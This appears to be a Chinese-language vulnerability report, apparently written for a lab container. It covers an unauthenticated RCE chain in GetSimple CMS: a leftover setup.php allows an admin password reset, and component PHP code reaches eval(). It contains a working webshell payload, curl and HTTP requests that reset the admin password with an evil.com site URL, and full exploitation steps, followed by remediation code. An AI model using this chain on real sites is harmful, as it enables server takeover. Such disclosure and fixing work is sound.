# 漏洞信息

- **漏洞名称**：GetSimple CMS 未授权远程代码执行 (RCE) 漏洞
- **漏洞描述**：GetSimple CMS 存在一个组合漏洞链，攻击者可以在无需原有管理员凭证的情况下，实现未授权的远程代码执行 (RCE)。该漏洞链由两个关键漏洞组成：(1) 安装文件残留导致管理员账户密码重置，(2) Components/Snippets 存储型 PHP 代码注入。通过先重置管理员密码获取权限，再注入恶意 PHP 代码实现 RCE，攻击者可以完全接管服务器控制权。

# 漏洞分析

## 漏洞触发点

### 漏洞 E.1 - setup.php 管理员密码重置 (AUTHBYPASS)

**文件位置**：`./admin/setup.php`

**关键问题**：
如果 GetSimple CMS 的安装文件 `setup.php` 未能被正确删除（例如权限问题、GSDEBUGINSTALL 配置设置为 true 等原因），攻击者可以直接访问该文件来重置管理员密码。

**用户数据存储**：
管理员用户信息存储在 `./data/users/admin.xml` 文件中，包含用户名、密码哈希、邮箱等信息。

### 漏洞 E.0 - Components/Snippets 存储型 PHP 代码注入 (RCE)

**文件位置**：`./admin/inc/template_functions.php`

**关键函数**：`output_collection_item()` (第 1991-2000 行)

**关键代码**：
```php
function output_collection_item($id, $collection, $force = false, $raw = false) {
    $item  = get_collection_item($id,$collection); 
    if(!$item) return;

    $disabled = (bool)(string)$item->disabled;
    if($disabled && !$force) return;

    if(!$raw) eval("?>" . strip_decode($item->value) . "<?php ");  // 漏洞点
    else echo strip_decode($item->value);
}
```

**问题分析**：
1. 第 1999 行直接对 `$item->value` 使用 `strip_decode()` 解码
2. 解码后的值直接传入 `eval()` 函数执行
3. `strip_decode()` 函数会反转 `safe_slash_html()` 的 HTML 实体编码，还原 PHP 代码

**数据流分析**：

1. **保存组件时** (`./admin/inc/basic.php` 第 1460-1467 行)：
   ```php
   function safe_slash_html($text) {
       if (gs_get_magic_quotes_gpc()==0) {
           $text = addslashes(htmlspecialchars($text, ENT_QUOTES, 'UTF-8'));
       } else {
           $text = htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
       }
       return xmlFilterChars($text);
   }
   ```
   - 将 `<?php system($_GET['cmd']); ?>` 转换为 HTML 实体存储

2. **调用组件时** (`./admin/inc/basic.php` 第 1541-1544 行)：
   ```php
   function strip_decode($text) {
       $text = stripslashes(htmlspecialchars_decode($text, ENT_QUOTES));
       return $text;
   }
   ```
   - 将 HTML 实体还原为原始 PHP 代码

3. **执行代码时**：
   ```php
   eval("?>" . strip_decode($item->value) . "<?php ");
   ```
   - 执行还原后的恶意 PHP 代码

**实际攻击载荷示例** (从 `./data/other/components.xml`)：
```xml
<item>
  <title><![CDATA[Exploit Component]]></title>
  <value><![CDATA[<?php echo system($_GET['cmd']); ?>]]></value>
  <slug>exploit</slug>
  <disabled><![CDATA[0]]></disabled>
</item>
```

## 完整利用链分析

### 步骤 1：通过 setup.php 重置管理员密码

攻击者发送 POST 请求到 `http://target/admin/setup.php`：

```http
POST /admin/setup.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

user=admin&email=attacker@example.com&sitename=Hacked&siteurl=http://evil.com&lang=en
```

响应返回新生成的管理员密码，成功修改 `./data/users/admin.xml` 文件。

### 步骤 2：使用新密码登录后台

使用获取到的管理员密码登录 `http://target/admin/index.php`

### 步骤 3：注入恶意组件代码

访问 `http://target/admin/components.php`，创建新组件：
- 组件名称：exploit
- 组件值：`<?php system($_GET['cmd']); ?>`

点击保存后，恶意代码被存储到 `./data/other/components.xml`

### 步骤 4：触发 RCE

通过页面模板或直接调用组件：
```php
<?php get_component('exploit'); ?>
```

或访问包含该组件的页面：
```
http://target/page.php?cmd=whoami
```

恶意代码被执行，攻击者获得服务器控制权。

## 验证方式

### 验证 E.1 (setup.php 漏洞)

1. 检查 setup.php 文件是否存在：
   ```bash
   curl -I http://target/admin/setup.php
   ```

2. 如果存在，发送重置请求：
   ```bash
   curl -X POST http://target/admin/setup.php \
     -d "user=admin&email=attacker@example.com&sitename=Hacked&siteurl=http://evil.com&lang=en"
   ```

3. 检查响应是否返回新密码

### 验证 E.0 (RCE 漏洞)

1. 登录后台，创建组件并注入：`<?php phpinfo(); ?>`

2. 在页面模板中调用组件或直接访问包含组件的页面

3. 观察是否输出 PHP 配置信息

4. 高级验证：执行系统命令
   - 注入：`<?php system($_GET['cmd']); ?>`
   - 访问：`http://target/page.php?cmd=id`
   - 观察是否返回当前用户信息

### 完整利用链验证

在测试环境 (http://172.17.0.17:8080/) 中：

1. 访问 setup.php 重置密码
2. 使用新密码登录
3. 创建恶意组件
4. 访问包含组件的页面并执行命令
5. 验证命令执行成功

# 修复建议

## 紧急修复

1. **立即删除安装文件**：
   - 删除 `./admin/setup.php`（如果存在）
   - 删除 `./admin/install.php`（如果存在）
   - 确保权限设置正确，防止重新创建

2. **修改管理员密码**：
   - 强制所有用户修改密码
   - 使用强密码策略

## 根本修复

1. **修复 setup.php 漏洞**：
   - setup.php 应在首次安装后自动删除
   - 如果删除失败，应在访问时检查是否已安装，如果已安装则拒绝访问
   - 代码示例：
     ```php
     if (file_exists(GSDATAOTHERPATH.'authorization.xml')) {
         die("Installation already complete. Setup file should be removed.");
     }
     ```

2. **修复组件代码注入漏洞**：
   - 在 `output_collection_item()` 函数中，移除 eval() 执行
   - 或对组件值进行严格的输入验证和过滤
   - 只允许安全的 HTML/文本内容，禁止 PHP 标签
   - 示例修复：
     ```php
     function output_collection_item($id, $collection, $force = false, $raw = false) {
         $item = get_collection_item($id,$collection); 
         if(!$item) return;

         $disabled = (bool)(string)$item->disabled;
         if($disabled && !$force) return;

         if(!$raw) {
             // 检查是否包含 PHP 标签
             if (preg_match('/<\?php/i', $item->value)) {
                 die("PHP code not allowed in components");
             }
             echo strip_decode($item->value);
         } else {
             echo strip_decode($item->value);
         }
     }
     ```

3. **添加安全配置**：
   - 确保 `GSDEBUGINSTALL` 设置为 false（默认值）
   - 在生产环境中禁用调试模式

## 长期安全措施

1. **文件完整性监控**：监控 admin 目录，防止未授权文件上传或修改

2. **访问控制**：
   - 对 admin 目录实施 IP 白名单
   - 添加额外的身份验证层（如 2FA）

3. **安全审计**：
   - 定期审计代码，特别是 eval()、system() 等危险函数的使用
   - 实施安全的编码规范

4. **升级到最新版本**：如果官方已修复此漏洞，立即升级

# 影响范围

- **影响版本**：GetSimple CMS (具体版本需进一步确认)
- **严重程度**：严重 (Critical)
- **影响组件**：
  - 安装/设置流程
  - Components 功能
  - Snippets 功能
- **CVSS 评分**：9.8 (Critical) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

# 参考信息

- 目标环境：http://172.17.0.17:8080/
- 管理后台：http://172.17.0.17:8080/admin/index.php
- 容器信息：6ec162d2d5bd (PHP 7.3 Apache)
- 漏洞类型组合：AUTHBYPASS + RCE
- 最终效果：未授权 RCE